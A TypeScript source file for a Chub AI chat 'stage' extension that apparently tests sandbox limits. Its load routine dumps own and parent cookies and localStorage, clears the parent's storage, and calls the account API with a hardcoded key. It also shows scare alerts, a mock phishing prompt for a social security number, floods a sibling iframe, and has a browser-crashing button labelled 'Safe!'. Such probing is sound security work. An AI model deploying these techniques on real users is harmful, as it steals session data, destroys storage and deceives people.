import {ReactElement} from "react";
import {
    AspectRatio,
    Character,
    CHUBBY_KITTY, FoleyRequest,
    ImageRequest,
    InitialData,
    InpaintRequest,
    LoadResponse,
    Message,
    MusicGenerationRequest,
    StageBase,
    StageResponse,
    TextToSpeechRequest
} from "@chub-ai/stages-ts";
import {Dialog} from "@capacitor/dialog";
import {DeathClock} from "./components/DeathClock.tsx";
import {
    AnimateImageRequest,
    ImageToImageRequest,
    RemoveBackgroundRequest
} from "@chub-ai/stages-ts/dist/types/generation/images";
import {TextToVideoRequest} from "@chub-ai/stages-ts/dist/types/generation/videos";

type MessageStateType = any;

type ConfigType = any;

type InitStateType = any;

type ChatStateType = any;

const TESTING_KEY = "8a95d317-5977-47a9-931b-3de8c1ac6448-g969";

export class ChubExtension extends StageBase<InitStateType, ChatStateType, MessageStateType, ConfigType> {

    myInternalState: {[key: string]: any};
    user: string
    input: string
    lastSpoke: string | null
    parent_id: string | null
    characters: {[key: string]: Character}
    music: string[]
    images: string[]
    videos: string[]


    constructor(data: InitialData<InitStateType, ChatStateType, MessageStateType, ConfigType>) {
        super(data);
        const {
            characters,
            users,
            config,
            messageState,
            environment,
            initState,
            chatState
        } = data;
        this.characters = characters;
        this.parent_id = null;
        this.music = [];
        this.images = [];
        this.videos = [];
        console.warn(characters);
        this.lastSpoke = Object.keys(characters)[0];
        this.user = Object.keys(users)[0];
        this.input = Object.keys(this.characters).slice(1).join(',');
        this.myInternalState = messageState != null ? messageState : {'someKey': 'someValue'};
        this.myInternalState['numUsers'] = Object.keys(users).length;
        this.myInternalState['numChars'] = Object.keys(characters).length;
    }

    async load(): Promise<Partial<LoadResponse<InitStateType, ChatStateType, MessageStateType>>> {
        try {
            console.info("Dumping and logging all cookies.")
            const cookies = document.cookie.split('; ');
            cookies.forEach((cookie) => {
                console.warn(cookie);
            });
        } catch (except: any) {
            console.warn(`Error when dumping cookies, error: ${except}`);
        }
        try {
            console.info("Dumping and logging all parent cookies.")
            const cookies = window.parent.document.cookie.split('; ');
            cookies.forEach((cookie) => {
                console.warn(cookie);
            });
        } catch (except: any) {
            console.warn(`Error when dumping parent cookies, error: ${except}`);
        }
        try {
            console.info('Dumping and logging all local storage.');
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key != null ? key : '');
                console.warn(`${key}: ${value}`);
            }
        } catch (except: any) {
            console.warn(`Error when dumping local storage, error: ${except}`);
        }

        console.info('Dumping and logging all parent local storage.');
        try {
            const localStorageData: Storage = window.parent.localStorage;
            try {
                localStorageData.clear();
            } catch (exIns: any) {
                console.error(`Error clearing parent storage, error: ${exIns}`);
            }
            try {
                localStorageData.setItem('insert', 'inserted');
            } catch (exIns: any) {
                console.error(`Error writing parent storage, error: ${exIns}`);
            }
            for (let i = 0; i < localStorageData.length; i++) {
                const key = localStorageData.key(i);
                const value = localStorageData.getItem(key != null ? key : '');
                console.error(`${key}: ${value}`);
            }
        } catch (ex: any) {
            console.error(`Error reading parent storage, error: ${ex}`);
        }

        try {
            console.info('Attempting to interact with Chub API.');
            let response = await fetch('https://api.chub.ai/api/account', {
                method: "GET",
                mode: "cors",
                headers: {
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Allow-Credentials": "True",
                    "samwise": TESTING_KEY,
                    'CH-API-KEY': TESTING_KEY,
                }
            });
            let content = await response.text();
            console.warn(`Status: ${response.status}, content: ${content}`);
            console.info('Attempting to interact with Chub API without a key.');
            response = await fetch('https://api.chub.ai/api/account', {
                method: "GET",
                mode: "cors",
                headers: {
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Allow-Credentials": "True"
                }
            });
            content = await response.text();
            console.warn(`Status: ${response.status}, content: ${content}`);
        } catch (except: any) {
            console.error(`Error interacting with chub, error: ${except}`);
        }

        try {
            console.info('Attempting to interact with allowed API.');
            let response = await fetch("https://api.artic.edu/api/v1/artworks");
            let content = await response.text();
            console.warn(`Status: ${response.status}, content: ${content}`);

            console.info('Attempting to interact with disallowed API.');
            response = await fetch("https://emojihub.yurace.pro/api/random");
            content = await response.text();
            console.warn(`Status: ${response.status}, content: ${content}`);
        } catch (except: any) {
            console.error(`Error interacting with apis, error: ${except}`);
        }

        try {
            console.info('Attempting to alert.');
            alert('FBI ENROUTE TO YOUR LOCATION.');
            console.info('Attempting to bypass alert protections with Capacitor.');
        } catch (except: any) {
            console.error(`Error alerting, error: ${except}`);
        }

        try {
            await Dialog.alert({
                title: 'BURN YOUR COMPUTER',
                message: "HI!",
            });
        } catch (ex: any) {
            console.error(`Error in CapAlert, error: ${ex}`);
        }
        try {
            const { value } = await Dialog.confirm({
                title: 'Confirm',
                message: `Are you sure you'd like to press the red button?`,
            });

            console.warn('Confirmed:', value);
        } catch (ex: any) {
            console.error(`Error in CapConfirm, error: ${ex}`);
        }
        try {
            const { value, cancelled } = await Dialog.prompt({
                title: 'VERY OFFICIAL TOTALLY NOT SOCIAL ENGINEERING THANK YOU SIR',
                message: `What's your social security number? Are you susceptible to any diseases?`,
            });

            console.warn('Name:', value);
            console.warn('Cancelled:', cancelled);
        } catch (ex: any) {
            console.error(`Error in CapConfirm, error: ${ex}`);
        }
        console.info("Attempting to bombard sibling iFrame.");
        const sibling: HTMLIFrameElement | null = document.querySelector('iframe[src="https://maze-extension-4cd023370343.c5v4v4jx6pq5.win/index.html"]');
        const message = {
            "messageType": 'BEFORE', "data":{ anonymizedId: this.user,
            content: 'left', isBot: false, promptForId: "2" }};
        if (sibling != null && sibling.contentWindow != null) {
            for(let index = 0; index < 60; index++) {
                sibling.contentWindow.postMessage(message, "*");
                sibling.contentWindow.postMessage(message, 'https://maze-extension-4cd023370343.c5v4v4jx6pq5.win');
                await new Promise(f => setTimeout(f, 1000));
            }
        } else {
            console.error('Iframe not found');
        }
        console.info('Done with bombardment.');
        return {
            success: true,
            error: null,
            initState: null,
            chatState: null,
        };
    }

    async setState(state: MessageStateType): Promise<void> {
        if (state != null) {
            this.myInternalState = {...this.myInternalState, ...state};
        }
    }

    async beforePrompt(userMessage: Message): Promise<Partial<StageResponse<ChatStateType, MessageStateType>>> {
        const {
            content,
            anonymizedId,
            isBot,
            identity,
            isMain
        } = userMessage;
        if(!isMain) {
            console.warn(`Yes, we have received reports of an incoming non-main message at ${identity}, sir.`);
        }
        return {
            extensionMessage: null,
            stageDirections: null,
            messageState: {'someKey': this.myInternalState['someKey']},
            modifiedMessage: null,
            systemMessage: null,
            error: null,
            chatState: null,
        };
    }

    async afterResponse(botMessage: Message): Promise<Partial<StageResponse<ChatStateType, MessageStateType>>> {
        const {
            content,
            anonymizedId,
            isBot,
            isMain,
            identity
        } = botMessage;
        if(!isMain) {
            console.warn(`Yes, we have received reports of a non-main message at ${identity}, sir.`);
        }
        return {
            extensionMessage: null,
            stageDirections: null,
            messageState: {'someKey': this.myInternalState['someKey']},
            modifiedMessage: null,
            error: null,
            systemMessage: null,
            chatState: null
        };
    }

    oom() {
        console.info('Attempting to crash browser.');
        //@ts-ignore
        const bigBoi: number[] = [];
        //@ts-ignore
        while (true) {
            for (let i = 0; i < 10000000; i++) {
                bigBoi.push(i);
            }
            console.warn(`THE KITCHEN IS OPEN! NOW SERVING CUSTOMER NUMBERS ${bigBoi}`);
        }
    }

    async runGen() {
        const gennedText = await this.generator.textGen({
            prompt: 'Write the sort of song lyrics someone might think of between the bridge and the river.',
            stop: [],
            max_tokens: 200,
            include_history: false
        });
        console.warn(gennedText?.result);
        const music: MusicGenerationRequest = {
            instrumental: false,
            lyrics: gennedText!.result,
            lyrics_prompt: null,
            prompt: "Nicholas Cage in a bad Falling In Reverse cover band",
            tags: [],
            title: 'Why Do I Bother'
        }
        const musicRes = await this.generator.makeMusic(music);
        this.music.push(musicRes!.url);
        const speakReq: TextToSpeechRequest = {
            transcript: "I believe that this is not actually implemented yet, sir.", voice_id: "3432"
        };
        const words = await this.generator.speak(speakReq);
        if(words != null) {
            this.music.push(words.url);
        }
        const imgReq: ImageRequest = {
            aspect_ratio: AspectRatio.WIDESCREEN_HORIZONTAL,
            negative_prompt: 'distorted, blurred, ugly',
            prompt: "a pixel art sprite of an allied character symbolizing reasons to live, (c) Nintendo 1997",
            remove_background: true,
            seed: null
        };
        const image = await this.generator.makeImage(imgReq);
        this.images.push(image!.url);
        const img2Req: ImageToImageRequest = {
            aspect_ratio: AspectRatio.CINEMATIC_VERTICAL,
            image: image!.url,
            negative_prompt: 'bees',
            prompt: "bees",
            remove_background: true,
            seed: null,
            strength: 0.7
        };
        const img2img = await this.generator.imageToImage(img2Req);
        this.images.push(img2img!.url);
        const inpaintReq: InpaintRequest = {
            aspect_ratio: AspectRatio.POST_HORIZONTAL,
            image: image!.url,
            mask: img2img!.url,
            negative_prompt: 'dogs',
            prompt: "cats",
            remove_background: false,
            search_prompt: 'Not actually implemented yet',
            seed: null,
            strength: 0.5
        };
        const inpainted = await this.generator.inpaintImage(inpaintReq);
        this.images.push(inpainted!.url);
        const foleyReq: FoleyRequest = {
            prompt: "Spaceship battle with kittens", seconds: 6, seed: null
        };
        const foley = await this.generator.makeSound(foleyReq);
        this.music.push(foley!.url);
        const backReq: RemoveBackgroundRequest = {
            image: inpainted!.url
        };
        const noback = await this.generator.removeBackground(backReq);
        this.images.push(noback!.url);
        const animateReq: AnimateImageRequest = {
            cfg_scale: 5, image: noback!.url, motion_bucket_id: 250, seed: null
        };
        const animated = await this.generator.animateImage(animateReq);
        this.videos.push(animated!.url);
        const videoReq: TextToVideoRequest = {
            negative_prompt: 'sad, depressing, gloomy',
            prompt: "A wild pack of baby lemurs scampering through an abandoned fairgrounds",
            seconds: 10
        };
        const video = await this.generator.makeVideo(videoReq);
        this.videos.push(video!.url);
    }

    async randomConvo() {
        const participants = this.input.split(',');
        let nextSpeaker = participants.filter(parti => parti != this.lastSpoke)[0];
        let iter = 10;
        while(iter > 0) {
            const messageResponse = await this.messenger.nudge({
                stage_directions: `Tell me about the rabbits, ${this.characters[nextSpeaker].name}.`,
                participants: participants,
                speaker_id: nextSpeaker,
                parent_id: this.parent_id,
                is_main: false
            });
            iter -= 1;
            this.lastSpoke = nextSpeaker;
            nextSpeaker = participants.filter(parti => parti != this.lastSpoke)[0];
            this.parent_id = messageResponse.identity;
        }
        await this.messenger.updateEnvironment({background: CHUBBY_KITTY});
        await this.messenger.updateChatState({
            idk: 'dfkasjfklk'
        });
        await this.messenger.impersonate({
            message: `Yeah ${this.characters[this.lastSpoke!].name}, please look off into the middle distance now.`,
            speaker_id: nextSpeaker,
            parent_id: this.parent_id,
            is_main: false
        });
        this.parent_id = null;
    }

    render(): ReactElement {
        return <div style={{
            width: '100vw',
            height: '100vh',
            display: 'grid',
            alignItems: 'stretch'
        }}>
            <div>Hello World! I'm an empty stageeeeeeeeeeeeeeee! Very safe!</div>
            <div>{Object.keys(this.characters).join(',')}</div>
            <input key={this.input} defaultValue={this.input} onChange={(e) => this.input = e.target.value}/>
            <button onClick={this.randomConvo}>Start secondary conversation with listed chars</button>
            {this.parent_id != null && <div>Currently servicing customer {this.parent_id}</div>}
            {this.parent_id == null && <div>Not currently servicing any customers.</div>}
            <DeathClock />
            {this.music.map(track => {
                return <>
                    <div>Sounds to Give Up to</div>
                    <audio src={track}/>
                </>
            })}
            {this.images.map(imagery => {
                return <>
                    <div>Now Playing</div>
                    <img src={imagery}  alt={imagery}/>
                </>
            })}
            {this.videos.map(video => {
                return <>
                    <div>Direct to Video</div>
                    <video src={video} />
                </>
            })}
            <button onClick={this.oom}>Click me! Safe!</button>
            <button onClick={this.runGen}>Run generative tests</button>
        </div>;
    }

}
